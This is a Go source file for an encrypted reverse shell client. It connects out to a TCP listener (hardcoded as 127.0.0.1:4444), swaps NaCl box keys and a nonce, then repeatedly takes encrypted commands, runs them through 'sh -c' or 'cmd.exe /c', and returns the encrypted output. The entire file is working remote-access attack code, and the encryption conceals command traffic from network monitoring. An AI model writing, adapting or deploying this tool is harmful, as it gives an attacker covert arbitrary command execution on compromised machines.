package main

import (
        "bufio"
        "code.google.com/p/go.crypto/nacl/box"
        "crypto/rand"
        "encoding/base64"
        "fmt"
        "log"
        "net"
        "os"
        "os/exec"
        "runtime"
        "strings"
)

const os_version string = runtime.GOOS

type KeyHolder struct {
        publicKey  *[32]byte
        privateKey *[32]byte
}

func main() {
        peerKeys := &KeyHolder{}
        server := "127.0.0.1:4444"
        addr, err := net.ResolveTCPAddr("tcp", server)
        if err != nil {
                fmt.Println(err)
                os.Exit(1)
        }
        conn, err := net.DialTCP("tcp", nil, addr)
        if err != nil {
                fmt.Println(err)
                os.Exit(1)
        }
        publicKey, privateKey, _ := setup()
        myKeys := &KeyHolder{publicKey, privateKey}
        nonce := keyExchange(myKeys, peerKeys, conn)
        for {
                func(c net.Conn) {
                        message, err := bufio.NewReader(c).ReadString('\n')
                        a := []byte(message)
                        i := len(a) - 1
                        a = a[:i+copy(a[i:], a[i+1:])]
                        //message := make([]byte, 1024)
                        //_, err := c.Read(message)
                        if err != nil {
                                fmt.Println("Error: ", err)
                        }
                        cmd, ok := decrypt(
                                *peerKeys.publicKey,
                                *myKeys.privateKey,
                                //[]byte(message),
                                string(a),
                                nonce,
                        )
                        if ok != true {
                                log.Fatal("Decrypt went wrong")
                        }
                        results := exec_cmd(string(cmd))
                        enc_mess := encrypt(
                                *peerKeys.publicKey,
                                *myKeys.privateKey,
                                nonce,
                                results,
                        )
                        c.Write([]byte(enc_mess + "\n"))
                }(conn)
        }
}

func exec_cmd(cmd string) []byte {
        parts := strings.Fields(cmd)
        head := parts[0]
        parts = parts[1:len(parts)]
        switch head {
        case "exit":
                os.Exit(0)
        case "cd":
                os.Chdir(parts[0])
                return []byte("dir chaged")
        default:
                //out, err := exec.Command(head, parts...).Output()
                if os_version != "windows" {
                        out, err := exec.Command("sh", "-c", cmd).Output()
                        if err != nil {
                                return []byte("command not found")
                        }
                        return out
                } else {
                        out, err := exec.Command("cmd.exe", "/c", cmd).Output()
                        if err != nil {
                                return []byte("command not found")
                        }
                        return out
                }

        }
        return nil
}

func setup() (private, public *[32]byte, err error) {
        return box.GenerateKey(rand.Reader)
}

func keyExchange(myKeys, peerKeys *KeyHolder, conn net.Conn) [24]byte {
        // Recieve Keys
        reply := make([]byte, 32)
        _, err := conn.Read(reply)
        if err != nil {
                log.Fatal(err)
        }
        var convert [32]byte
        copy(convert[:], reply)
        peerKeys.publicKey = &convert
        // Send Keys
        var myPub []byte
        for x := range *myKeys.publicKey {
                myPub = append(myPub, myKeys.publicKey[x])
        }
        conn.Write(myPub)
        // Recieve Nonce
        var nonce [24]byte
        reply2 := make([]byte, 24)
        _, err2 := conn.Read(reply2)
        if err2 != nil {
                log.Fatal(err)
        }
        copy(nonce[:], reply2)
        return nonce
}

func encrypt(publicKey, privateKey [32]byte, nonce [24]byte, message []byte) string {
        enc := box.Seal(nil, message, &nonce, &publicKey, &privateKey)
        return base64.StdEncoding.EncodeToString(enc)
}

func decrypt(publicKey, privateKey [32]byte, message string, nonce [24]byte) (open []byte, status bool) {
        dec, _ := base64.StdEncoding.DecodeString(message)
        return box.Open(nil, dec, &nonce, &publicKey, &privateKey)
}
